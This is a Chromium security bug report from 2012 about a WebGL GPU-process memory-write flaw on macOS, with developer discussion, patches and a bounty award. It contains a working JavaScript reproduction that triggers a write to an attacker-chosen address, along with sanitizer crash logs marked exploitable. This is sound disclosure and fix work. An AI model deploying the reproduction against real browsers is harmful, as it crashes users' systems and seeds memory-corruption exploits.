# Security: webgl - after running out of memory, buffer can still be written

| Field | Value |
|-------|-------|
| **Issue ID** | [40076125](https://issues.chromium.org/issues/40076125) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>WebGL, Internals |
| **Platforms** | Mac |
| **Reporter** | mi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2012-09-17 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**

when the gpu process runs out of memory, a webgl buffer is destroyed.  

calling gl.bufferSubData(gl.ARRAY\_BUFFER, 0x1234567, lolBuf) will still attempt to write to the buffer.

fwiw, I have 8 gigs of ram on this computer, for ASAN a good value for medium number is 2^29. For regular build under crashwrangler, 2^30 is more appropriate, but reloading a few times will crash the regular browser with 2^29 as well.

**VERSION**  

Chrome Version: stable + dev  

Operating System: osx 10.8 64bit (mountain lion)

**REPRODUCTION CASE**

<html>
<head>
<script>
gl=document.createElement('canvas').getContext('experimental-webgl')
var mediumNumber = Math.pow(2,29)
var lolBuf = new Uint8Array(0x10000000)
gl.bindBuffer(gl.ARRAY\_BUFFER, gl.createBuffer())
gl.bufferData(gl.ARRAY\_BUFFER, lolBuf, gl.STATIC\_DRAW)
gl.bufferData(gl.ARRAY\_BUFFER, mediumNumber, gl.STATIC\_DRAW)
gl.bindBuffer(gl.ARRAY\_BUFFER, gl.createBuffer())
gl.bufferData(gl.ARRAY\_BUFFER, lolBuf, gl.STATIC\_DRAW)
gl.bufferData(gl.ARRAY\_BUFFER, mediumNumber, gl.STATIC\_DRAW)
gl.bufferSubData(gl.ARRAY\_BUFFER, 0x1234567, lolBuf)
</script>
</head>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: gpu process  

Crash State:

# [4502:-1402541528:0917/130445:ERROR:gles2\_cmd\_decoder.cc(5191)] .WebGLRenderingContext: GL ERROR :GL\_OUT\_OF\_MEMORY : : ASAN:SIGSEGV

==4502== ERROR: AddressSanitizer crashed on unknown address 0x01234567 (pc 0x951ba9b4 sp 0xbff823b0 bp 0xbff823b8 T0)  

AddressSanitizer can not provide additional info.  

#0 0x951ba9b3 in memmove$VARIANT$sse42 (in libsystem\_c.dylib) + 86  

#1 0x13b8fcff in glBufferSubData\_Exec (in GLEngine) + 860  

#2 0x9206a7bd in glBufferSubData (in libGL.dylib) + 51  

#3 0x545dfe1 in gpu::gles2::GLES2DecoderImpl::DoBufferSubData(unsigned int, long, long, void const\*) (in Chromium Framework) + 705

exception=EXC\_BAD\_ACCESS:signal=10:is\_exploitable=yes:instruction\_disassembly=movb %al,(%edi):instruction\_address=0x00000000951ba9b4:access\_type=write:access\_address=0x0000000001234567:  

Crash accessing invalid address. Consider running it again with libgmalloc(3) to see if the log changes.

Crashed Thread: 0 CrGpuMain Dispatch queue: com.apple.main-thread

Exception Type: EXC\_BAD\_ACCESS (SIGBUS)  

Exception Codes: KERN\_PROTECTION\_FAILURE at 0x0000000001234567

Thread 0 Crashed:: CrGpuMain Dispatch queue: com.apple.main-thread  

0 libsystem\_c.dylib 0x951ba9b4 memmove$VARIANT$sse42 + 87  

1 GLEngine 0x05b00d00 glBufferSubData\_Exec + 861  

2 libGL.dylib 0x9206a7be glBufferSubData + 52

eax: 0x01234500 ebx: 0x7ee56d78 ecx: 0x00ffffb7 edx: 0x00000009  

edi: 0x01234567 esi: 0x087dc041 ebp: 0xbff28608 esp: 0xbff28600

## Attachments

- [01.txt](attachments/01.txt) (text/x-c; charset=us-ascii, 4.2 KB)
- [01.html](attachments/01.html) (text/html; charset=us-ascii, 649 B)
- [01-crashwrangler.txt](attachments/01-crashwrangler.txt) (text/plain; charset=us-ascii, 41.9 KB)

## Timeline

### gl...@chromium.org (2012-09-17)

Strange enough that ASan does not intercept memmove$VARIANT$sse42(), I'll need to take a closer look. This doesn't invalidate the report.

### sc...@gmail.com (2012-09-21)

@miaubiz: this is only MacOS?

I was about to blame MacOS libraries but I think it might be some faulty signed integer overflow checks again in BufferManager::BufferInfo this time, e.g.

bool BufferManager::BufferInfo::SetRange(
    GLintptr offset, GLsizeiptr size, const GLvoid * data) {
  if (offset < 0 || offset + size < offset || offset + size > size_) {

/* Oops -- offset and size are both signed. Compiler can rewrite "offset + size < offset" to "size < 0". */

### sc...@gmail.com (2012-09-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-24)

I'm happy to take this and fix the noted issue in https://crbug.com/chromium/149904#c2 if you GPU guys are busy? Just let me know.

### kb...@chromium.org (2012-09-24)

Sorry for the delay. I meant to reproduce this in an ASAN build last week. I can now do so and will see whether fixing the overflow check above has any effect.


[16431:-1408412992:0924/152240:ERROR:gles2_cmd_decoder.cc(5176)] .WebGLRenderingContext: GL ERROR :GL_OUT_OF_MEMORY : :
ASAN:SIGSEGV
=================================================================
==16431== ERROR: AddressSanitizer crashed on unknown address 0x01234567 (pc 0x9133aa14 sp 0xc0087380 bp 0xc0087388 T0)
AddressSanitizer can not provide additional info.
    #0 0x9133aa13 in memmove$VARIANT$sse42 (in libsystem_c.dylib) + 86
    #1 0x16b201aa in glBufferSubData_Exec (in GLEngine) + 811
    #2 0x9a0b4707 in glBufferSubData (in libGL.dylib) + 50
    #3 0x54bcaf1 in gpu::gles2::GLES2DecoderImpl::DoBufferSubData(unsigned int, long, long, void const*) (in Chromium Framework) + 705
    #4 0x546dee0 in gpu::gles2::GLES2DecoderImpl::HandleBufferSubData(unsigned int, gpu::gles2::BufferSubData const&) (in Chromium Framework) + 1264
    #5 0x545dbd5 in gpu::gles2::GLES2DecoderImpl::DoCommand(unsigned int, unsigned int, void const*) (in Chromium Framework) + 6709
    #6 0x5423677 in gpu::CommandParser::ProcessCommand() (in Chromium Framework) + 871
    #7 0x54d09fe in gpu::GpuScheduler::PutChanged() (in Chromium Framework) + 2478
    #8 0x91ea6b4 in GpuCommandBufferStub::PutChanged() (in Chromium Framework) + 324
    #9 0x91eeee5 in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (GpuCommandBufferStub::*)()>, void ()(GpuCommandBufferStub*), void ()(base::internal::UnretainedWrapper<GpuCommandBufferStub>)>, void ()(GpuCommandBufferStub*)>::Run(base::internal::BindStateBase*) (in Chromium Framework) + 133
    #10 0x5424e64 in gpu::CommandBufferService::Flush(int) (in Chromium Framework) + 212
    #11 0x91e5919 in GpuCommandBufferStub::OnAsyncFlush(int, unsigned int) (in Chromium Framework) + 1033
    #12 0x91df604 in GpuCommandBufferStub::OnMessageReceived(IPC::Message const&) (in Chromium Framework) + 7924
    #13 0x91e90da in non-virtual thunk to GpuCommandBufferStub::OnMessageReceived(IPC::Message const&) (in Chromium Framework) + 26
    #14 0x9265bb5 in MessageRouter::RouteMessage(IPC::Message const&) (in Chromium Framework) + 709
    #15 0x91c8b77 in GpuChannel::HandleMessage() (in Chromium Framework) + 2407
    #16 0x91d0bca in base::internal::Invoker<1, base::internal::BindState<base::internal::RunnableAdapter<void (GpuChannel::*)()>, void ()(GpuChannel*), void ()(base::WeakPtr<GpuChannel>)>, void ()(GpuChannel*)>::Run(base::internal::BindStateBase*) (in Chromium Framework) + 218
    #17 0x5345874 in MessageLoop::RunTask(base::PendingTask const&) (in Chromium Framework) + 3252
    #18 0x5346dba in MessageLoop::DoWork() (in Chromium Framework) + 2906
    #19 0x529d1b8 in base::MessagePumpLibevent::Run(base::MessagePump::Delegate*) (in Chromium Framework) + 1704
    #20 0x5343ff0 in MessageLoop::RunInternal() (in Chromium Framework) + 624
    #21 0x5396c54 in base::RunLoop::Run() (in Chromium Framework) + 68
    #22 0x53429c1 in MessageLoop::Run() (in Chromium Framework) + 113
    #23 0x46a203e in GpuMain(content::MainFunctionParams const&) (in Chromium Framework) + 6254
    #24 0x966db06 in content::RunNamedProcessTypeMain(std::string const&, content::MainFunctionParams const&, content::ContentMainDelegate*) (in Chromium Framework) + 326
    #25 0x966fd42 in content::ContentMainRunnerImpl::Run() (in Chromium Framework) + 898
    #26 0x966cfd5 in content::ContentMain(int, char const**, content::ContentMainDelegate*) (in Chromium Framework) + 197
    #27 0x10da483 in ChromeMain (in Chromium Framework) (chrome_main.cc:32)
    #28 0x90ed8 in 
    #29 0x90eb4 in 
    #30 0x6
Stats: 1542M malloced (265M for red zones) by 20800 calls
Stats: 0M realloced by 180 calls
Stats: 1540M freed by 17549 calls
Stats: 1540M really freed by 16793 calls
Stats: 948M (242698 full pages) mmaped in 15 calls
  mmaps   by size class: 8:32766; 9:8191; 10:4095; 11:2047; 12:1024; 13:512; 14:512; 15:128; 16:64; 17:32; 19:8; 31:1; 35:1;
  mallocs by size class: 8:19265; 9:440; 10:358; 11:121; 12:100; 13:200; 14:262; 15:33; 16:6; 17:7; 19:4; 31:2; 35:2;
  frees   by size class: 8:16486; 9:306; 10:222; 11:67; 12:67; 13:175; 14:182; 15:30; 16:1; 17:5; 19:4; 31:2; 35:2;
  rfrees  by size class: 8:15777; 9:288; 10:204; 11:56; 12:67; 13:175; 14:182; 15:30; 16:1; 17:5; 19:4; 31:2; 35:2;
Stats: malloc large: 45 small slow: 123
==16431== ABORTING


### kb...@chromium.org (2012-09-24)

It looks like fixing the overflow check has no effect on the reproduction of this bug. It crashes in the same way. Here is the patch I applied to buffer_manager.cc. Let me know if there is something obviously wrong with it. Fixing this correctly would be a little tricky because GLintptr and GLsizeiptr are different sizes on 32-bit and 64-bit OSs, so a new SafeAdd variant would be needed.


diff --git a/gpu/command_buffer/service/buffer_manager.cc b/gpu/command_buffer/service
index cac64d5..f4d9c0d 100644
--- a/gpu/command_buffer/service/buffer_manager.cc
+++ b/gpu/command_buffer/service/buffer_manager.cc
@@ -107,9 +107,13 @@ void BufferManager::BufferInfo::SetInfo(
 
 bool BufferManager::BufferInfo::SetRange(
     GLintptr offset, GLsizeiptr size, const GLvoid * data) {
-  if (offset < 0 || offset + size < offset || offset + size > size_) {
+  if (offset < 0)
+    return false;
+  int32 sum = 0;
+  if (!SafeAddInt32(static_cast<int32>(offset), static_cast<int32>(size), &sum))
+    return false;
+  if (sum > size_)
     return false;
-  }
   if (shadowed_) {
     memcpy(shadow_.get() + offset, data, size);
     ClearCache();


### [Deleted User] (2012-09-24)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-09-24)

I think you want this code for the SafeAddInt32 check (in both SetRange and GetRange):

int32 sum = 0;
if (offset < 0 || size < 0 || offset > INT_MAX || size > INT_MAX || !SafeAddInt32(static_cast<int32>(offset), static_cast<int32>(size), &sum))
  return false;

### kb...@chromium.org (2012-09-24)

The bug is in Apple's OpenGL driver. The first call to glBufferData allocates a GPU buffer of a certain size. One of the subsequent calls to glBufferData is causing a GL_OUT_OF_MEMORY error. Under this condition the buffer's data store has been deleted. The subsequent call to glBufferSubData should therefore generate a GL_INVALID_VALUE error, but doesn't, due to insufficient error checking in the driver.

The command buffer implementation can check for this. Here's a patch which catches the error and causes the test case to just start producing the correct OpenGL errors rather than crashing. Note that I am not sure that this won't have a significant adverse performance effect on Mac and Linux platforms. There, the GLES2DecoderImpl::bufferdata_faster_than_buffersubdata_ flag is set to true, and now we will be calling glGetError on the "fast path".

Should I send this out for review, or do you want to handle the fix some less publicly visible way?


diff --git a/gpu/command_buffer/service/gles2_cmd_decoder.cc b/gpu/command_buffer/serv
index 7074606..b155e60 100644
--- a/gpu/command_buffer/service/gles2_cmd_decoder.cc
+++ b/gpu/command_buffer/service/gles2_cmd_decoder.cc
@@ -6873,6 +6873,8 @@ void GLES2DecoderImpl::DoBufferData(
   if (error == GL_NO_ERROR) {
     buffer_manager()->SetInfo(info, size, usage);
     info->SetRange(0, size, data);
+  } else {
+    buffer_manager()->SetInfo(info, 0, usage);
   }
 }
 
@@ -6921,7 +6923,12 @@ void GLES2DecoderImpl::DoBufferSubData(
   }
   if (bufferdata_faster_than_buffersubdata_ &&
       offset == 0 && size == info->size()) {
+    CopyRealGLErrorsToWrapper();
     glBufferData(target, size, data, info->usage());
+    GLenum error = PeekGLError();
+    if (error != GL_NO_ERROR) {
+      buffer_manager()->SetInfo(info, 0, info->usage());
+    }
     return;
   }
   glBufferSubData(target, offset, size, data);


### sc...@gmail.com (2012-09-24)

It's not clear what the bug is from the patch so you can send it out for review if you want to go this route.

How do we find out if it's a performance headache? It seems silly to pay a penalty for all platforms simply because the Mac driver is more vulnerable than average :) Maybe the defense could be conditionally compiled for Mac only? Some other idea?


### pi...@chromium.org (2012-09-24)

I'm afraid the glGetError will essentially do a glFinish on at least some drivers.

### kb...@chromium.org (2012-09-25)

I'm going to remove the optimization which transforms glBufferSubData calls into glBufferData calls if they replace the entire contents of the buffer. In order to defend against driver bugs in this area it's essential to check for errors after glBufferData calls, and doing so will defeat the optimization.

The code already checks for errors when calling glBufferData, so there's no performance penalty associated with improving the bookkeeping there.

I tested on Windows and the GPU process crashes inside Chrome's OOM handler while allocating the temporary zeroed int array ("new int8[size]"), which is safe and is reported as a lost context. It'll be difficult to test other OpenGL drivers because all of the Linux machines around here are 64-bit and allocate the large buffers easily.

Patch up for review at https://codereview.chromium.org/10989011 .


### kb...@chromium.org (2012-09-25)

[Empty comment from Monorail migration]

### mi...@gmail.com (2012-09-25)

@scarybeasts: is it possible to have clang/llvm tell you about those integer overflows with undefined results? relying on undefined results seems iffy :|

### sc...@gmail.com (2012-09-25)

It does seem like there should be a compile warning but I don't know of anything specific. Have you tried Googling around for either a Clang or GCC flag? Seems either would do.

There's -ftrapv, which IIRC actually runtime traps upon integer overflows. You then need to trigger the overflow at runtime (e.g. more fuzzing!) but at least it's guaranteed to get noticed ;-)

### mi...@gmail.com (2012-09-25)

@kbr: does the overflow fix the repro from 149717? 

### bu...@chromium.org (2012-09-25)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=158665

------------------------------------------------------------------------
r158665 | kbr@chromium.org | 2012-09-25T21:52:13.806504Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/trunk/src/gpu/command_buffer/service/gles2_cmd_decoder.cc?r1=158665&r2=158664&pathrev=158665

Defend against NULL pointer dereferences in buggy OpenGL drivers.

BUG=149904
TEST=test case from bug; unit tests


Review URL: https://chromiumcodereview.appspot.com/10989011
------------------------------------------------------------------------

### kb...@chromium.org (2012-09-26)

@miaubiz: actually I think this does not fix https://crbug.com/chromium/149717. Investigating that one separately.

@cevans, I'm reassigning this to you for the integer overflow fix you wanted above. I can't prove that any changes to that code have any effect, and it sounds like even my attempted hacks in that area were incorrect.


### mi...@gmail.com (2012-09-26)

@scarybeasts: does INT_MAX-offset < size work?



### sc...@gmail.com (2012-09-26)

@miaubiz: yeah, that approach broadly works for signed integer effects, as long as you also check that offset >= 0 and size >= 0. Well, it works for 32-bit types, I think we have different widths here on 64-bit systems. etc. etc.

### sc...@gmail.com (2012-09-28)

Ok, I'm going to split out the signed integer overflow possible issue that I noticed into another bug.

This bug represents the workaround for the really interesting NULL+offset bug inside the Apple drivers.

I'll take care of merging the fix, probably to M23 -- seems like we can live without it in M22.

### sc...@gmail.com (2012-10-02)

Thank you miaubiz. Well, since we were able to work around Apple's bug, it's definitely reward-worthy.
$1000

### sc...@gmail.com (2012-10-11)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-10-18)

merged to m23 in r162726

### bu...@chromium.org (2012-10-18)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=162726

------------------------------------------------------------------------
r162726 | inferno@chromium.org | 2012-10-18T17:26:03.322768Z

Changed paths:
   M http://src.chromium.org/viewvc/chrome/branches/1271/src/gpu/command_buffer/service/gles2_cmd_decoder.cc?r1=162726&r2=162725&pathrev=162726

Merge 158665 - Defend against NULL pointer dereferences in buggy OpenGL drivers.

BUG=149904
TEST=test case from bug; unit tests


Review URL: https://chromiumcodereview.appspot.com/10989011

TBR=kbr@chromium.org
Review URL: https://codereview.chromium.org/11192062
------------------------------------------------------------------------

### kb...@chromium.org (2012-11-01)

[Empty comment from Monorail migration]

### js...@chromium.org (2012-12-20)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/149904?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40076125)*
